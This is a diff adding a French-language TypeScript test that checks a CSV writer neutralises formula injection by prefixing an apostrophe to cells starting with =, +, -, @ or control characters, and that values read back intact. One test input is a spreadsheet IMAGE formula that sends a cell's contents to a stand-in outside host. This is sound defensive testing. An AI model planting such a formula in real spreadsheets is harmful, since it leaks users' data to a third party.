@@ -761,6 +761,63 @@ describe('M5.1 / décisions de Val — jamais perdues en silence', () => {
     expect(() => exigerAucunBlocage(plan)).toThrow(/clients-a-valider\.csv/);
   });
 
+  it('cellule commençant par = + - @, tabulation ou retour chariot : écrite précédée d’une apostrophe (Google Sheets n’exécute rien), clés et décisions relues intactes', () => {
+    // Clés de lieu tirées d'adresses inventées : une adresse peut commencer par ces caractères.
+    const formule = '=image("https://exemple.invalid/x?"&a1)';
+    const tiret = '- pavillon est, 1 rue de l’exemple 75001 paris';
+    const deja = "'=deja une apostrophe";
+    const lignes = [
+      { cle: formule, nom: '@Salon', longitude: -1.55, groupe_decide: tiret },
+      {
+        cle: tiret,
+        nom: '+33 1 00 00 00 00',
+        longitude: '',
+        groupe_decide: 'distinct',
+      },
+      { cle: deja, nom: '\tSalon\r2', longitude: 2.3, groupe_decide: '' },
+      {
+        cle: 'l-4',
+        nom: "Salon, l'Annexe",
+        longitude: '-0',
+        groupe_decide: deja,
+      },
+    ];
+    const texte = ecrireCsv(Object.keys(lignes[0]!), lignes);
+    expect(texte).toBe(
+      [
+        'cle,nom,longitude,groupe_decide',
+        `"'=image(""https://exemple.invalid/x?""&a1)",'@Salon,-1.55,"'${tiret}"`,
+        `"'${tiret}",'+33 1 00 00 00 00,,distinct`,
+        `''=deja une apostrophe,"'\tSalon\r2",2.3,`,
+        `l-4,"Salon, l'Annexe",-0,''=deja une apostrophe`,
+        '',
+      ].join('\n'),
+    );
+    const lire = (contenu: string) => {
+      const blocages: string[] = [];
+      const lues = lireDecisions(
+        dossierDecisions({ 'lieux-a-valider.csv': contenu }),
+        'lieux-a-valider.csv',
+        'cle',
+        'groupe_decide',
+        blocages,
+      );
+      expect(blocages).toEqual([]);
+      return lues;
+    };
+    expect(lire(texte)).toEqual(
+      new Map([
+        [formule, tiret],
+        [tiret, 'distinct'],
+        ['l-4', deja],
+      ]),
+    );
+    // Google Sheets peut avoir retiré l'apostrophe ajoutée à l'écriture : la clé reste la même.
+    const parSheets = lire(texte.replace(/(^|,|")'(?=[=+\-@])/gm, '$1'));
+    expect(parSheets.get(formule)).toBe(tiret);
+    expect(parSheets.get(tiret)).toBe('distinct');
+  });
+
   it('fichier mal formé (guillemet jamais refermé ou mal placé, lignes au mauvais séparateur, cellules en trop, colonne en double) : blocage, jamais zéro décision en silence', () => {
     const blocages: string[] = [];
     const dossier = dossierDecisions({
